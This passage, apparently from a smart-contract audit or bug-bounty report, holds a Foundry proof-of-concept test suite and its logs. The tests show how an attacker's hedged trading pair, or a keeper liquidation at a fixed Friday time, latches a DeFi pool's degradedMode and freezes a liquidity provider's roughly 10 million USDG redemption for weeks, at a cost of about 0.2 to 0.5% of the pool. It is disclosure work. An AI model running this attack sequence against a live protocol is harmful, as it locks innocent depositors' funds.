        if (err == DEGRADED) return "reverts HousePool__DegradedMode";
        return string.concat("reverts ", vm.toString(abi.encodePacked(err)));
    }

    function _trySettle(uint256 px) internal returns (bool ok, bytes4 err) {
        bytes memory ret;
        if (engine.isOracleFrozen()) {
            vm.prank(KEEPER);
            (ok, ret) = address(pool).call(abi.encodeCall(pool.settleLpEpoch, (uint256(0), uint256(0))));
        } else {
            bytes[] memory d = _px(px);
            vm.prank(KEEPER);
            (ok, ret) = address(router).call(abi.encodeCall(router.settleLpEpoch, (d)));
        }
        err = ok || ret.length < 4 ? bytes4(0) : bytes4(ret);
    }

    // A fresh mark when live, a keeper settle (frozen pass or live), the victim's claim of whatever was funded.
    function _probe(string memory tag, uint256 since, uint256 px) internal returns (Probe memory p) {
        if (!engine.isOracleFrozen()) _refreshMark(px);
        p.t = _now();
        p.frozen = engine.isOracleFrozen();
        p.free = pool.getFreeAssets();
        (p.settleOk, p.err) = _trySettle(px);
        if (juniorVault.claimableRedeemRequest(requestId, LP_J) > 0) _claimRedeemAll(juniorVault, LP_J, requestId);
        p.wallet = settlementToken.balanceOf(LP_J);
        console2.log(string.concat("-- ", tag, " +", _hm(p.t - since), ", unix ", vm.toString(p.t)));
        console2.log(
            string.concat(
                "   oracle frozen: ", _b(p.frozen), "  degradedMode: ", _b(engine.degradedMode()), "  free LP cash: ", _usd(p.free)
            )
        );
        console2.log(
            string.concat("   keeper settleLpEpoch: ", p.settleOk ? "ok" : _errName(p.err), "  victim LP_J wallet: ", _usd(p.wallet))
        );
    }

    function _attempt(string memory what, bool callOk, uint256 px) internal returns (uint256) {
        (bool sOk, bytes4 err) = _trySettle(px);
        console2.log(
            string.concat(
                "     ",
                what,
                ": call ",
                callOk ? "succeeded" : "reverted",
                "; degradedMode after: ",
                _b(engine.degradedMode()),
                "; settle after: ",
                sOk ? "ok" : _errName(err)
            )
        );
        assertTrue(engine.degradedMode() && !sOk && err == DEGRADED, "the freeze holds after the attempt");
        return 1;
    }

    // Every permissionless call that could end the freeze, each run alone from the latched state and rolled back.
    function _unlockAttempts(uint256 px) internal returns (uint256 n) {
        console2.log("   permissionless unlock attempts, each from this latched state and rolled back:");
        bool ok;
        uint256 s = vm.snapshotState();
        vm.prank(OUTSIDER);
        (ok,) = address(engine).call(abi.encodeCall(engine.clearDegradedMode, ()));
        n += _attempt("1. outsider calls engine.clearDegradedMode()", ok, px);
        vm.revertToState(s);

        s = vm.snapshotState();
        bytes[] memory d = _px(px);
        vm.prank(OUTSIDER);
        (ok,) = address(router).call(abi.encodeCall(router.updateMarkPrice, (d)));
        n += _attempt("2. outsider posts a fresh mark (router.updateMarkPrice)", ok, px);
        vm.revertToState(s);

        s = vm.snapshotState();
        settlementToken.mint(OUTSIDER, 1_000_000e6);
        vm.prank(OUTSIDER);
        ok = settlementToken.transfer(address(pool), 1_000_000e6);
        n += _attempt("3. outsider donates 1,000,000 USDG to the pool", ok, px);
        vm.revertToState(s);

        s = vm.snapshotState();
        _fundTrader(OUTSIDER, 100_000e6);
        ok = _tryOpenNow(OUTSIDER, CfdTypes.Side.LONG, _sizeFor(50_000e6, px), 5_000e6, px);
        n += _attempt("4. a new trader opens a 50,000 USDG position", ok, px);
        vm.revertToState(s);

        s = vm.snapshotState();
        settlementToken.mint(OUTSIDER, 100_000e6);
        vm.prank(OUTSIDER);
        settlementToken.approve(address(juniorVault), 100_000e6);
        vm.prank(OUTSIDER);
        (ok,) = address(juniorVault).call(
            abi.encodeWithSignature("requestDeposit(uint256,address,address)", 100_000e6, OUTSIDER, OUTSIDER)
        );
        n += _attempt("5. a new LP requests a 100,000 USDG Junior deposit", ok, px);
        vm.revertToState(s);

        s = vm.snapshotState();
        d = _px(px);
        vm.prank(LP_J);
        (ok,) = address(router).call(abi.encodeCall(router.settleLpEpoch, (d)));
        n += _attempt("6. the victim LP_J calls router.settleLpEpoch itself", ok, px);
        vm.revertToState(s);
    }

    function _marginDeposit(uint256 bps) internal pure returns (uint256) {
        return POS_CAP * (bps + FEE_ROOM_BPS) / 10_000;
    }

    // Both attacker accounts are flat, so their whole clearinghouse balance is withdrawable.
    function _withdrawPair() internal returns (uint256 wallet) {
        uint256 a = clearinghouse.balanceAssets(ATTACKER);
        uint256 b = clearinghouse.balanceAssets(ATTACKER_B);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, a);
        vm.prank(ATTACKER_B);
        clearinghouse.withdraw(ATTACKER_B, b);
        wallet = settlementToken.balanceOf(ATTACKER) + settlementToken.balanceOf(ATTACKER_B);
    }

    function _pctOfPool(uint256 amount) internal pure returns (string memory) {
        uint256 h = amount * 10_000 / JUNIOR;
        return string.concat(vm.toString(h / 100), ".", h % 100 < 10 ? "0" : "", vm.toString(h % 100), "%");
    }

    function _impact(Result memory r) internal view {
        console2.log("");
        _row("account", "no-latch control", "attack", "delta");
        _row("VICTIM LP_J wallet", _usd(r.controlPaid), _usd(r.attackWallet), _usdSigned(int256(r.attackWallet) - int256(r.controlPaid)));
        console2.log("");
        console2.log(string.concat("IMPACT ", r.route));
        console2.log("IMPACT row: Temporary freezing of funds for at least 24 hours (High)");
        console2.log(
            string.concat(
                "IMPACT frozen: victim LP_J's matured Junior redemption, ", _usd(r.frozenAssets), " USDG, paid only after the owner's clear"
            )
        );
        console2.log(
            string.concat(
                "IMPACT frozen for: ", _hm(r.frozenFor), " (", vm.toString(r.frozenFor / 1 days), " days) after the arm, still frozen at the last probe"
            )
        );
        console2.log(string.concat("IMPACT free LP cash in the pool at every probe: at least ", _usd(r.minFree), " USDG"));
        console2.log(
            string.concat(
                "IMPACT self-clears: no. degradedMode stayed true at every probe; ",
                vm.toString(r.attempts),
                " permissionless unlock attempts left it set"
            )
        );
        console2.log("IMPACT only exit: the owner's clearDegradedMode(); the same keeper settle then paid the victim at once");
        console2.log(
            string.concat(
                "IMPACT control, same trades without the latch: victim paid ", _usd(r.controlPaid), " USDG ", _hm(r.controlAfter), " later"
            )
        );
        uint256 cost = r.armCost < 0 ? uint256(-r.armCost) : 0;
        console2.log(
            string.concat(
                "IMPACT attacker's deposit (margin + fees): ", _usd(r.deposit), " USDG; withdrawn back after the closes: ", _usd(r.withdrawn), " USDG"
            )
        );
        console2.log(
            string.concat(
                "IMPACT attacker's full cost, deposit to withdrawal: ", _usd(cost), " USDG = ", _pctOfPool(cost),
                " of the 10,000,000 USDG pool; 1 USDG spent per ", vm.toString(r.frozenAssets / cost), " USDG frozen"
            )
        );
    }

    // ------------------------------------------------------------------ route A: the attacker's own hedged pair

    function test_A_pairWinnerClose_latchFreezesLpExit_noSelfClearIn30Days() public {
        _warpTo(WEEK_MON_10UTC);
        _fundJunior(LP_J, JUNIOR);
        uint256 dep = _marginDeposit(A_WIN_BPS) + _marginDeposit(A_LOSE_BPS);
        _fundTrader(ATTACKER, _marginDeposit(A_LOSE_BPS));
        _fundTrader(ATTACKER_B, _marginDeposit(A_WIN_BPS));
        _refreshMark(PX);
        uint256 n = _buildPairAsym(A_WIN_BPS, A_LOSE_BPS, PX);
        console2.log(
            string.concat(
                "ROUTE A, Monday 2024-10-14 10:00 UTC: hedged pair ", _usd(n), " USDG per side (SHORT pledge 60 bps, LONG pledge 150 bps), L = ",
                _usd(_maxLiability()), "; attacker deposit ", _usd(dep), " USDG"
            )
        );
        _warpTo(_now() + 1 hours + 1);
        uint256 shares;
        (requestId, shares) = _requestRedeemAll(juniorVault, LP_J);
        console2.log(
            string.concat("victim LP_J requests redemption of its whole Junior position, worth ", _usd(juniorVault.convertToAssets(shares)))
        );
        uint256 px = PX + PAIR_MOVE_BP * 1e4;
        _refreshMark(px);
        console2.log("mark +86 bps: the SHORT leg (ATTACKER_B) wins, the LONG leg (ATTACKER) loses");
        uint256 snap = vm.snapshotState();

        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);
        _closeNow(ATTACKER_B, CfdTypes.Side.SHORT, _sizeOf(ATTACKER_B), px);
        assertFalse(engine.degradedMode(), "control: loser closed first arms nothing");
        uint256 tc = _now();
        _warpTo(tc + 1 hours + 5 minutes);
        Probe memory c = _probe("CONTROL (loser closed first), time since the closes:", tc, px);
        assertTrue(c.settleOk, "control: settle runs");
        assertGt(c.wallet, 9_900_000e6, "control: victim paid");
        vm.revertToState(snap);

        _closeNow(ATTACKER_B, CfdTypes.Side.SHORT, _sizeOf(ATTACKER_B), px);
        uint256 tArm = _now();
        assertTrue(engine.degradedMode(), "the winner close armed degradedMode");
        console2.log(
            string.concat("ATTACK: winner closed first, degradedMode = true, E - L = -", _usd(_maxLiability() - _effectiveAssets()))
        );
        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);
        assertEq(_maxLiability(), 0, "pair gone, L = 0");
        assertTrue(engine.degradedMode(), "latch stays after E >= L again");
        Result memory r;
        r.deposit = dep;
        r.withdrawn = _withdrawPair();
        r.armCost = int256(r.withdrawn) - int256(r.deposit);
        console2.log(
            string.concat(
                "ATTACK: loser closed, L = 0 and E = ", _usd(_effectiveAssets()), ", degradedMode still true; the attacker withdraws ",
                _usd(r.withdrawn), " of its ", _usd(r.deposit), " USDG deposit"
            )
        );

        uint256[5] memory waits = [uint256(1 hours + 5 minutes), 24 hours, 72 hours, 7 days, 30 days];
        Probe memory p;
        r.minFree = type(uint256).max;
        for (uint256 i; i < 5; ++i) {
            _warpTo(tArm + waits[i]);
            p = _probe("ATTACK, time since the arm:", tArm, px);
            assertGt(p.free, 9_900_000e6, "free LP cash is in the pool");
            assertFalse(p.settleOk, "settle blocked");
            assertEq(p.err, DEGRADED, "by degradedMode");
            assertEq(p.wallet, 0, "victim unpaid");
            if (p.free < r.minFree) r.minFree = p.free;
            if (i == 1 || i == 4) r.attempts += _unlockAttempts(px);
        }

        engine.clearDegradedMode();
        Probe memory released = _probe("OWNER clearDegradedMode() at the last probe, then the same keeper settle, time since the arm:", tArm, px);
        assertTrue(released.settleOk, "settle runs after the owner's clear");
        assertGt(released.wallet, 9_900_000e6, "the victim is paid at once");

        r.route = "route A: the attacker closes the winning leg of its own hedged pair first (live market, Monday)";
        r.frozenAssets = released.wallet;
        r.frozenFor = p.t - tArm;
        r.attackWallet = p.wallet;
        r.controlPaid = c.wallet;
        r.controlAfter = c.t - tc;
        _impact(r);
    }

    // ------------------------------------------------------------------ route B: any keeper's liquidation at the FAD start

    // Thin SHORT on ATTACKER_B (wins when the price rises), thick LONG on ATTACKER, laddered to the open solvency buffer.
    function _buildPairAsym(uint256 shortBps, uint256 longBps, uint256 price) internal returns (uint256 n) {
        uint256 step = (pool.totalAssets() * 39) / 100;
        uint256 quantumAssets = (CfdTypes.SIZE_QUANTUM * price) / 1e20;
        while (step >= router.minOpenNotionalAssets()) {
            uint256 size = _sizeFor(step, price);
            uint256 lots = size * price / 1e20;
            if (lots < quantumAssets || !_tryOpenNow(ATTACKER, CfdTypes.Side.LONG, size, lots * longBps / 10_000, price)) {
                step /= 2;
                continue;
            }
            if (!_tryOpenNow(ATTACKER_B, CfdTypes.Side.SHORT, size, lots * shortBps / 10_000, price)) {
                _closeNow(ATTACKER, CfdTypes.Side.LONG, size, price);
                step /= 2;
                continue;
            }
            n += lots;
        }
    }

    function _setupFad() internal {
        _warpTo(FRI_FAD_START - 3 hours);
        _fundJunior(LP_J, JUNIOR);
        _fundTrader(ATTACKER, _marginDeposit(B_LOSE_BPS));
        _fundTrader(ATTACKER_B, _marginDeposit(B_WIN_BPS));
        _refreshMark(PX);
        uint256 n = _buildPairAsym(B_WIN_BPS, B_LOSE_BPS, PX);
        _warpTo(_now() + 1 hours + 1);
        uint256 shares;
        (requestId, shares) = _requestRedeemAll(juniorVault, LP_J);
        console2.log(
            string.concat(
                "ROUTE B, Friday 2024-10-18 17:30 UTC: pair ", _usd(n), " USDG per side (SHORT pledge 35 bps, LONG pledge 400 bps); attacker deposit ",
                _usd(_marginDeposit(B_WIN_BPS) + _marginDeposit(B_LOSE_BPS)), " USDG"
            )
        );
        console2.log(
            string.concat("victim LP_J requests redemption of its whole Junior position, worth ", _usd(juniorVault.convertToAssets(shares)))
        );
    }

    function test_B_fadStartKeeperLiquidation_latchFreezesLpExit_noSelfClearIn27Days() public {
        _setupFad();
        uint256 px = PX + FAD_MOVE_BP * 1e4;
        uint256 snap = vm.snapshotState();

        _warpTo(FRI_FAD_START);
        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);
        _liquidate(KEEPER, ATTACKER_B, px);
        assertEq(_sizeOf(ATTACKER_B), 0, "control: winner liquidated");
        assertFalse(engine.degradedMode(), "control: loser closed first arms nothing");
        uint256 tc = _now();
        _warpTo(tc + 1 hours + 5 minutes);
        Probe memory c = _probe("CONTROL (loser closed first, then the same liquidation), time since the closes:", tc, px);
        assertTrue(c.frozen && c.settleOk, "control: the frozen pass runs");
        assertGt(c.wallet, 9_800_000e6, "control: victim paid");
        vm.revertToState(snap);

        _warpTo(FRI_FAD_START);
        assertTrue(engine.isFadWindow(), "FAD window");
        _liquidate(KEEPER, ATTACKER_B, px);
        uint256 tArm = _now();
        assertEq(_sizeOf(ATTACKER_B), 0, "winner liquidated by a third-party keeper");
        assertTrue(engine.degradedMode(), "the liquidation armed degradedMode");
        console2.log(
            string.concat(
                "ATTACK: KEEPER liquidates the thin winner at the first FAD mark (+53 bps): degradedMode = true, E - L = -",
                _usd(_maxLiability() - _effectiveAssets())
            )
        );
        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);
        assertEq(_maxLiability(), 0, "pair gone, L = 0");
        assertTrue(engine.degradedMode(), "latch stays after E >= L again");
        Result memory r;
        r.deposit = _marginDeposit(B_WIN_BPS) + _marginDeposit(B_LOSE_BPS);
        r.withdrawn = _withdrawPair();
        r.armCost = int256(r.withdrawn) - int256(r.deposit);
        console2.log(
            string.concat(
                "ATTACK: attacker closes its loser, L = 0 and E = ", _usd(_effectiveAssets()), ", degradedMode still true; the attacker withdraws ",
                _usd(r.withdrawn), " of its ", _usd(r.deposit), " USDG deposit"
            )
        );

        uint256[6] memory at =
            [tArm + 1 hours + 5 minutes, tArm + 24 hours, SUN_REOPEN + 30 minutes, tArm + 72 hours, tArm + 6 days, tArm + 27 days];
        Probe memory p;
        r.minFree = type(uint256).max;
        for (uint256 i; i < 6; ++i) {
            _warpTo(at[i]);
            p = _probe(i < 2 ? "ATTACK (weekend freeze), time since the arm:" : "ATTACK (live market), time since the arm:", tArm, px);
            assertEq(p.frozen, i < 2, "frozen until the Sunday reopen");
            assertGt(p.free, 9_800_000e6, "free LP cash is in the pool");
            assertFalse(p.settleOk, "settle blocked");
            assertEq(p.err, DEGRADED, "by degradedMode");
            assertEq(p.wallet, 0, "victim unpaid");
            if (p.free < r.minFree) r.minFree = p.free;
            if (i == 3 || i == 5) r.attempts += _unlockAttempts(px);
        }

        engine.clearDegradedMode();
        Probe memory released = _probe("OWNER clearDegradedMode() at the last probe, then the same keeper settle, time since the arm:", tArm, px);
        assertTrue(released.settleOk, "settle runs after the owner's clear");
        assertGt(released.wallet, 9_800_000e6, "the victim is paid at once");

        r.route = "route B: any keeper liquidates the pair's thin winner at the Friday FAD start (calendar-fixed time)";
        r.frozenAssets = released.wallet;
        r.frozenFor = p.t - tArm;
        r.attackWallet = p.wallet;
        r.controlPaid = c.wallet;
        r.controlAfter = c.t - tc;
        _impact(r);
    }

    // ------------------------------------------------------------------ cost against pool size, routes A and B

    // Fill the room the coarse ladder leaves: one more pair sized to the remaining open capacity, shrinking until it fits.
    function _topUp(uint256 winBps, uint256 loseBps, uint256 price) internal returns (uint256 added) {
        uint256 quantumAssets = (CfdTypes.SIZE_QUANTUM * price) / 1e20;
        uint256 e = _effectiveAssets();
        uint256 l = _maxLiability();
        uint256 s = e * 10_000 / 10_025 > l ? e * 10_000 / 10_025 - l : 0;
        while (s >= router.minOpenNotionalAssets()) {
            uint256 size = _sizeFor(s, price);
            uint256 lots = size * price / 1e20;
            if (lots >= quantumAssets && _tryOpenNow(ATTACKER, CfdTypes.Side.LONG, size, lots * loseBps / 10_000 + 1, price)) {
                if (_tryOpenNow(ATTACKER_B, CfdTypes.Side.SHORT, size, lots * winBps / 10_000 + 1, price)) return lots;
                _closeNow(ATTACKER, CfdTypes.Side.LONG, size, price);
            }
            uint256 dec = s / 50;
            s -= dec > quantumAssets ? dec : quantumAssets;
        }
    }

    // Arms the latch on a pool of the given size with the same margins as above; returns the attacker's full cost.
    function _armAtSize(bool routeB, uint256 poolSize) internal returns (uint256 dep, uint256 cost) {
        uint256 s = vm.snapshotState();
        (uint256 winBps, uint256 loseBps) = routeB ? (B_WIN_BPS, B_LOSE_BPS) : (A_WIN_BPS, A_LOSE_BPS);
        uint256 cap = poolSize * 9975 / 10_000;
        dep = cap * (winBps + FEE_ROOM_BPS) / 10_000 + cap * (loseBps + FEE_ROOM_BPS) / 10_000;
        _warpTo(routeB ? FRI_FAD_START - 3 hours : WEEK_MON_10UTC);
        _fundJunior(LP_J, poolSize);
        _fundTrader(ATTACKER, cap * (loseBps + FEE_ROOM_BPS) / 10_000);
        _fundTrader(ATTACKER_B, cap * (winBps + FEE_ROOM_BPS) / 10_000);
        _refreshMark(PX);
        _buildPairAsym(winBps, loseBps, PX);
        _topUp(winBps, loseBps, PX);
        _warpTo(_now() + 1 hours + 1);
        uint256 px = PX + (routeB ? FAD_MOVE_BP : PAIR_MOVE_BP) * 1e4;
        if (routeB) {
            _warpTo(FRI_FAD_START);
            _liquidate(KEEPER, ATTACKER_B, px);
        } else {
            _refreshMark(px);
            _closeNow(ATTACKER_B, CfdTypes.Side.SHORT, _sizeOf(ATTACKER_B), px);
        }
        assertTrue(engine.degradedMode(), "armed at this pool size");
        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);
        assertTrue(engine.degradedMode() && _maxLiability() == 0, "latched with the pair flat");
        cost = dep - _withdrawPair();
        vm.revertToState(s);
    }

    function test_C_attackerCostIsAShareOfThePool() public {
        uint256[4] memory sizes = [uint256(100_000e6), 1_000_000e6, 3_000_000e6, 10_000_000e6];
        console2.log("COST AGAINST POOL SIZE: the latch armed, and stayed set with the pair flat, at every size below");
        _row("pool size", "route A full cost", "route B full cost", "");
        for (uint256 i; i < 4; ++i) {
            (, uint256 costA) = _armAtSize(false, sizes[i]);
            (, uint256 costB) = _armAtSize(true, sizes[i]);
            _row(_usd(sizes[i]), _usd(costA), _usd(costB), "");
            assertApproxEqRel(costA * 1e18 / sizes[i], 0.0049e18, 0.05e18, "route A costs about 0.49% of the pool");
            assertApproxEqRel(costB * 1e18 / sizes[i], 0.0022e18, 0.05e18, "route B costs about 0.22% of the pool");
        }
        console2.log("IMPACT cost scales with the pool: about 0.49% of its size (route A) and 0.22% (route B), so a small pool costs little to freeze");
    }
}
```

### Output

```
Ran 3 tests for test/poc/DegradedLatchFreezePoC.t.sol:DegradedLatchFreezePoC
[PASS] test_A_pairWinnerClose_latchFreezesLpExit_noSelfClearIn30Days() (gas: 88261276)
Logs:
  ROUTE A, Monday 2024-10-14 10:00 UTC: hedged pair 9974500.000000 USDG per side (SHORT pledge 60 bps, LONG pledge 150 bps), L = 9974500.000000; attacker deposit 221445.000000 USDG
  victim LP_J requests redemption of its whole Junior position, worth 9999999.999991
  mark +86 bps: the SHORT leg (ATTACKER_B) wins, the LONG leg (ATTACKER) loses
  -- CONTROL (loser closed first), time since the closes: +1 h 5 min, unix 1728911122
     oracle frozen: false  degradedMode: false  free LP cash: 10061872.244971
     keeper settleLpEpoch: ok  victim LP_J wallet: 10061870.239068
  ATTACK: winner closed first, degradedMode = true, E - L = -5581.783939
  ATTACK: loser closed, L = 0 and E = 10041657.535045, degradedMode still true; the attacker withdraws 171806.664955 of its 221445.000000 USDG deposit
  -- ATTACK, time since the arm: +1 h 5 min, unix 1728911121
     oracle frozen: false  degradedMode: true  free LP cash: 10041657.535045
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK, time since the arm: +24 h 0 min, unix 1728993621
     oracle frozen: false  degradedMode: true  free LP cash: 10041657.535045
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
     permissionless unlock attempts, each from this latched state and rolled back:
       1. outsider calls engine.clearDegradedMode(): call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       2. outsider posts a fresh mark (router.updateMarkPrice): call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       3. outsider donates 1,000,000 USDG to the pool: call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       4. a new trader opens a 50,000 USDG position: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       5. a new LP requests a 100,000 USDG Junior deposit: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       6. the victim LP_J calls router.settleLpEpoch itself: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
  -- ATTACK, time since the arm: +72 h 0 min, unix 1729166421
     oracle frozen: false  degradedMode: true  free LP cash: 10041657.535045
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK, time since the arm: +168 h 0 min, unix 1729512021
     oracle frozen: false  degradedMode: true  free LP cash: 10041657.535045
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK, time since the arm: +720 h 0 min, unix 1731499221
     oracle frozen: false  degradedMode: true  free LP cash: 10041657.535045
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
     permissionless unlock attempts, each from this latched state and rolled back:
       1. outsider calls engine.clearDegradedMode(): call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       2. outsider posts a fresh mark (router.updateMarkPrice): call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       3. outsider donates 1,000,000 USDG to the pool: call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       4. a new trader opens a 50,000 USDG position: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       5. a new LP requests a 100,000 USDG Junior deposit: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       6. the victim LP_J calls router.settleLpEpoch itself: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
  -- OWNER clearDegradedMode() at the last probe, then the same keeper settle, time since the arm: +720 h 0 min, unix 1731499223
     oracle frozen: false  degradedMode: false  free LP cash: 10041657.535045
     keeper settleLpEpoch: ok  victim LP_J wallet: 10041655.524176
      account                       no-latch control      attack                delta
      VICTIM LP_J wallet            10061870.239068       0.000000              -10061870.239068
  IMPACT route A: the attacker closes the winning leg of its own hedged pair first (live market, Monday)
  IMPACT row: Temporary freezing of funds for at least 24 hours (High)
  IMPACT frozen: victim LP_J's matured Junior redemption, 10041655.524176 USDG, paid only after the owner's clear
  IMPACT frozen for: 720 h 0 min (30 days) after the arm, still frozen at the last probe
  IMPACT free LP cash in the pool at every probe: at least 10041657.535045 USDG
  IMPACT self-clears: no. degradedMode stayed true at every probe; 12 permissionless unlock attempts left it set
  IMPACT only exit: the owner's clearDegradedMode(); the same keeper settle then paid the victim at once
  IMPACT control, same trades without the latch: victim paid 10061870.239068 USDG 1 h 5 min later
  IMPACT attacker's deposit (margin + fees): 221445.000000 USDG; withdrawn back after the closes: 171806.664955 USDG
  IMPACT attacker's full cost, deposit to withdrawal: 49638.335045 USDG = 0.49% of the 10,000,000 USDG pool; 1 USDG spent per 202 USDG frozen

[PASS] test_B_fadStartKeeperLiquidation_latchFreezesLpExit_noSelfClearIn27Days() (gas: 84709068)
Logs:
  ROUTE B, Friday 2024-10-18 17:30 UTC: pair 9974500.000000 USDG per side (SHORT pledge 35 bps, LONG pledge 400 bps); attacker deposit 445882.500000 USDG
  victim LP_J requests redemption of its whole Junior position, worth 9999999.999991
  -- CONTROL (loser closed first, then the same liquidation), time since the closes: +1 h 5 min, unix 1729287302
     oracle frozen: true  degradedMode: false  free LP cash: 10072656.371417
     keeper settleLpEpoch: ok  victim LP_J wallet: 9997109.456747
  ATTACK: KEEPER liquidates the thin winner at the first FAD mark (+53 bps): degradedMode = true, E - L = -5113.244544
  ATTACK: attacker closes its loser, L = 0 and E = 10009273.016025, degradedMode still true; the attacker withdraws 423641.433975 of its 445882.500000 USDG deposit
  -- ATTACK (weekend freeze), time since the arm: +1 h 5 min, unix 1729287301
     oracle frozen: true  degradedMode: true  free LP cash: 10009273.016025
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK (weekend freeze), time since the arm: +24 h 0 min, unix 1729369801
     oracle frozen: true  degradedMode: true  free LP cash: 10009273.016025
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK (live market), time since the arm: +49 h 0 min, unix 1729459801
     oracle frozen: false  degradedMode: true  free LP cash: 10009273.016025
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK (live market), time since the arm: +72 h 0 min, unix 1729542602
     oracle frozen: false  degradedMode: true  free LP cash: 10009273.016025
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
     permissionless unlock attempts, each from this latched state and rolled back:
       1. outsider calls engine.clearDegradedMode(): call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       2. outsider posts a fresh mark (router.updateMarkPrice): call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       3. outsider donates 1,000,000 USDG to the pool: call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       4. a new trader opens a 50,000 USDG position: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       5. a new LP requests a 100,000 USDG Junior deposit: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       6. the victim LP_J calls router.settleLpEpoch itself: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
  -- ATTACK (live market), time since the arm: +144 h 0 min, unix 1729801802
     oracle frozen: false  degradedMode: true  free LP cash: 10009273.016025
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
  -- ATTACK (live market), time since the arm: +648 h 0 min, unix 1731616202
     oracle frozen: false  degradedMode: true  free LP cash: 10009273.016025
     keeper settleLpEpoch: reverts HousePool__DegradedMode  victim LP_J wallet: 0.000000
     permissionless unlock attempts, each from this latched state and rolled back:
       1. outsider calls engine.clearDegradedMode(): call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       2. outsider posts a fresh mark (router.updateMarkPrice): call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       3. outsider donates 1,000,000 USDG to the pool: call succeeded; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       4. a new trader opens a 50,000 USDG position: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       5. a new LP requests a 100,000 USDG Junior deposit: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
       6. the victim LP_J calls router.settleLpEpoch itself: call reverted; degradedMode after: true; settle after: reverts HousePool__DegradedMode
  -- OWNER clearDegradedMode() at the last probe, then the same keeper settle, time since the arm: +648 h 0 min, unix 1731616204
     oracle frozen: false  degradedMode: false  free LP cash: 10009273.016025
     keeper settleLpEpoch: ok  victim LP_J wallet: 10009271.008906
      account                       no-latch control      attack                delta
      VICTIM LP_J wallet            9997109.456747        0.000000              -9997109.456747
  IMPACT route B: any keeper liquidates the pair's thin winner at the Friday FAD start (calendar-fixed time)
  IMPACT row: Temporary freezing of funds for at least 24 hours (High)
  IMPACT frozen: victim LP_J's matured Junior redemption, 10009271.008906 USDG, paid only after the owner's clear
  IMPACT frozen for: 648 h 0 min (27 days) after the arm, still frozen at the last probe
  IMPACT free LP cash in the pool at every probe: at least 10009273.016025 USDG
  IMPACT self-clears: no. degradedMode stayed true at every probe; 12 permissionless unlock attempts left it set
  IMPACT only exit: the owner's clearDegradedMode(); the same keeper settle then paid the victim at once
  IMPACT control, same trades without the latch: victim paid 9997109.456747 USDG 1 h 5 min later
  IMPACT attacker's deposit (margin + fees): 445882.500000 USDG; withdrawn back after the closes: 423641.433975 USDG
  IMPACT attacker's full cost, deposit to withdrawal: 22241.066025 USDG = 0.22% of the 10,000,000 USDG pool; 1 USDG spent per 450 USDG frozen

[PASS] test_C_attackerCostIsAShareOfThePool() (gas: 470437058)
Logs:
  COST AGAINST POOL SIZE: the latch armed, and stayed set with the pair flat, at every size below
      pool size                     route A full cost     route B full cost     
      100000.000000                 497.428812            223.917073            
      1000000.000000                4966.780839           2226.580849           
      3000000.000000                14890.623505          6673.814083           
      10000000.000000               49638.335045          22241.066025          
  IMPACT cost scales with the pool: about 0.49% of its size (route A) and 0.22% (route B), so a small pool costs little to freeze

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 748.90ms (1.01s CPU time)

Ran 1 test suite in 752.55ms (748.90ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

Route A's closing table is the ledger: victim LP_J's wallet is 0.000000 USDG after 720 hours under the latch, against 10,061,870.239068 USDG paid 1 h 5 min after the same closes without it, while the pool holds 10,041,657.535045 USDG of free LP cash.

